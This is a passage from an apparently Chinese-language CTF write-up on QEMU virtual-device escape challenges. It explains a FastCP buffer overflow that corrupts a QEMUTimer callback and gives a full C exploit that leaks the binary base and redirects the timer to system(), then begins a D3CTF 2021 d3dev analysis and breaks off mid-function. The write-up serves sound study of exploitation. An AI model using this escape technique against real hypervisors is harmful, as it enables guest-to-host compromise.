class="number">1</span>);</span><br></pre></td></tr></table></figure><p>我们首先来看看<code>cpu_physical_memory_rw</code>函数。该函数的原型大概如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr,</span></span><br><span class="line"><span class="params">                            <span class="type">void</span> *buf,</span></span><br><span class="line"><span class="params">                            hwaddr len,</span></span><br><span class="line"><span class="params">                            <span class="type">bool</span> is_write)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>hwaddr addr</code>：要读取或写入的物理内存地址。</li><li><code>void *buf</code>：指向数据缓冲区的指针，该缓冲区包含要写入内存的数据（在写入操作时），或用于接收从内存中读取的数据（在读取操作时）。</li><li><code>hwaddr len</code>：要读取或写入的数据长度。</li><li><code>bool is_write</code>：指示操作是读取<code>（false）</code>还是写入<code>（true）</code>。</li></ul><p>可以看到程序会遍历<code>CP_list_src</code>并将其数据复制<code>0x18</code>字节到<code>cp_info</code>，然后从<code>cp_info.CP_src</code>复制c<code>p_info.CP_cnt</code>字节的数据到<code>opaque-&gt;CP_buffer</code>，最后从<code>opaque-&gt;CP_buffer</code>复制<code>cp_info.CP_cnt</code>字节数据到<code>cp_info.CP_dst</code>中，即从<code>cp_info.CP_src</code>复制<code>cp_info.CP_cnt</code>字节的数据到<code>cp_info.CP_dst</code>中。我们可以想到，当<code>CP_cnt</code>足够大时是不是可以造成溢出呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)</span><br><span class="line">00000000 pdev PCIDevice_0 ?</span><br><span class="line">000008F0 mmio MemoryRegion_0 ?</span><br><span class="line">000009E0 cp_state CP_state ?</span><br><span class="line">000009F8 handling db ?</span><br><span class="line">000009F9 db ? ; undefined</span><br><span class="line">000009FA db ? ; undefined</span><br><span class="line">000009FB db ? ; undefined</span><br><span class="line">000009FC irq_status dd ?</span><br><span class="line">00000A00 CP_buffer db 4096 dup(?)</span><br><span class="line">00001A00 cp_timer QEMUTimer_0 ?</span><br><span class="line">00001A30 FastCPState ends</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>CP_buffer</code>变量只有<code>0x1000</code>字节，当<code>CP_cnt</code>足够大时，我们就可以对<code>cp_timer</code>结构体进行读写操作。我们再来看看<code>cp_timer</code>结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000 QEMUTimer_0 struc ; (sizeof=0x30, align=0x8, copyof_1181)</span><br><span class="line">00000000                                         ; XREF: FastCPState/r</span><br><span class="line">00000000 expire_time dq ?</span><br><span class="line">00000008 timer_list dq ?                         ; offset</span><br><span class="line">00000010 cb dq ?                                 ; offset</span><br><span class="line">00000018 opaque dq ?                             ; offset</span><br><span class="line">00000020 next dq ?                               ; offset</span><br><span class="line">00000028 attributes dd ?</span><br><span class="line">0000002C scale dd ?</span><br><span class="line">00000030 QEMUTimer_0 ends</span><br></pre></td></tr></table></figure><p>我们可以看到我们熟悉的<code>cb</code>指针和<code>opaque</code>指针。我们可以利用溢出来读取地址然后通过溢出来修改<code>cb</code>指针为<code>system</code>的<code>plt</code>表，<code>opaque</code>指向函数参数即可完成逃逸<br>这里提一下<code>WJH</code>师傅说的要注意的点：所有在设备中的操作地址都是指 <code>QEMU</code> 模拟的物理地址，但是程序中使用 <code>mmap</code> 申请的是虚拟地址空间。所以要注意使用 <code>mmap</code> 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址<br>原理懂了后，由于很烂的<code>C</code>语言水平，还是写不出<code>exp</code>脚本，以下为参考<code>WJH</code>师傅的<code>exp</code>所编写</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MAP_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">hash_map_entry</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> key, value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hash_map_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; hash_map_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">hash_map</span> &#123;</span></span><br><span class="line">    hash_map_entry **entry;</span><br><span class="line">&#125; hash_map;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">hash_map_get</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> entry-&gt;value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_set</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            entry-&gt;value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_entry *entry = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(hash_map_entry));</span><br><span class="line">    entry-&gt;next = <span class="built_in">map</span>-&gt;entry[hash];</span><br><span class="line">    entry-&gt;key = key;</span><br><span class="line">    entry-&gt;value = value;</span><br><span class="line">    <span class="built_in">map</span>-&gt;entry[hash] = entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_del</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash], *prev = <span class="literal">NULL</span>; entry; prev = entry, entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            prev == <span class="literal">NULL</span> ? (<span class="built_in">map</span>-&gt;entry[hash] = entry-&gt;next) : (prev-&gt;next = entry-&gt;next);</span><br><span class="line">            <span class="built_in">free</span>(entry);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_init</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">map</span>-&gt;entry = <span class="built_in">calloc</span>(HASH_MAP_SIZE, <span class="keyword">sizeof</span>(hash_map_entry *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_clear</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_MAP_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[i], *next; entry; entry = next) &#123;</span><br><span class="line">            next = entry-&gt;next, <span class="built_in">free</span>(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_to_paddr</span><span class="params">(<span class="type">size_t</span> vaddr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pagemap_fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    lseek(pagemap_fd, vaddr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET);</span><br><span class="line">    <span class="type">size_t</span> data;</span><br><span class="line">    assert(read(pagemap_fd, &amp;data, <span class="number">8</span>) == <span class="number">8</span>);</span><br><span class="line">    close(pagemap_fd);</span><br><span class="line">    <span class="keyword">return</span> data * PAGE_SIZE + (vaddr % PAGE_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *vaddr[<span class="number">2</span>];</span><br><span class="line">    <span class="type">size_t</span> paddr;</span><br><span class="line">&#125; adjacent_pages_buf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">release_pages</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[i]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">            assert(munmap((<span class="type">void</span> *) entry-&gt;value, PAGE_SIZE) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_clear(<span class="built_in">map</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_adjacent_pages</span><span class="params">(adjacent_pages_buf *buf)</span> &#123;</span><br><span class="line">    hash_map *<span class="built_in">map</span> = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(hash_map *));</span><br><span class="line">    hash_map_init(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">size_t</span> vaddr = (<span class="type">size_t</span>) (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">void</span> *) vaddr, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">        <span class="type">size_t</span> paddr = vaddr_to_paddr(vaddr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] new page %p %p\n&quot;</span>, paddr, vaddr);</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">1</span>] = (<span class="type">void</span> *) hash_map_get(<span class="built_in">map</span>, paddr + <span class="number">0x1000</span>)) != (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">0</span>] = (<span class="type">void</span> *) vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr + <span class="number">0x1000</span>);</span><br><span class="line">            release_pages(<span class="built_in">map</span>), <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">0</span>] = (<span class="type">void</span> *) hash_map_get(<span class="built_in">map</span>, paddr - <span class="number">0x1000</span>)) != (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">1</span>] = (<span class="type">void</span> *) vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr - <span class="number">0x1000</span>;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr - <span class="number">0x1000</span>);</span><br><span class="line">            hash_map_clear(<span class="built_in">map</span>), <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash_map_set(<span class="built_in">map</span>, paddr, vaddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SRC 0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CNT 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> CP_src;</span><br><span class="line">    <span class="type">size_t</span> CP_cnt;</span><br><span class="line">    <span class="type">size_t</span> CP_dst;</span><br><span class="line">&#125; CP_info;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;wslview calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf read_buf;</span><br><span class="line">    get_adjacent_pages(&amp;read_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf vaddr[0]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf vaddr[1]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf paddr: %p\n&quot;</span>, read_buf.paddr);</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf write_buf;</span><br><span class="line">    get_adjacent_pages(&amp;write_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf vaddr[0]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf vaddr[1]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf paddr: %p\n&quot;</span>, write_buf.paddr);</span><br><span class="line"></span><br><span class="line">    (*(CP_info *) write_buf.vaddr[<span class="number">0</span>]).CP_dst = read_buf.paddr;</span><br><span class="line">    (*(CP_info *) write_buf.vaddr[<span class="number">0</span>]).CP_cnt = <span class="number">0x1040</span>;</span><br><span class="line">    mmio_write(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write(CNT, <span class="number">1</span>);</span><br><span class="line">    mmio_write(CMD, <span class="number">0x4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> timer_list_addr = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> elf_base = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">2</span>] - <span class="number">0x4dce80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, elf_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x2c2180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt: %p\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> opaque_addr = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] opaque addr: %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++) &#123;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_src = write_buf.paddr;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_dst = read_buf.paddr;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_cnt = <span class="number">0x1020</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x8</span>) = timer_list_addr;</span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x10</span>) = system_plt;</span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x18</span>) = opaque_addr + <span class="number">0xa00</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span> *) (write_buf.vaddr[<span class="number">0</span>] + <span class="number">0x500</span>), cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line">    mmio_write(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write(CNT, <span class="number">0x11</span>);</span><br><span class="line">    mmio_write(CMD, <span class="number">0x1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(CMD, <span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D3CTF-2021-d3dev"><a href="#D3CTF-2021-d3dev" class="headerlink" title="[D3CTF 2021] d3dev"></a>[D3CTF 2021] d3dev</h2><h3 id="关键函数-1"><a href="#关键函数-1" class="headerlink" title="关键函数"></a>关键函数</h3><h4 id="d3dev-mmio-read"><a href="#d3dev-mmio-read" class="headerlink" title="d3dev_mmio_read"></a>d3dev_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">-957401312</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="type">unsigned</span> <span class="type">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">1640531527</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span 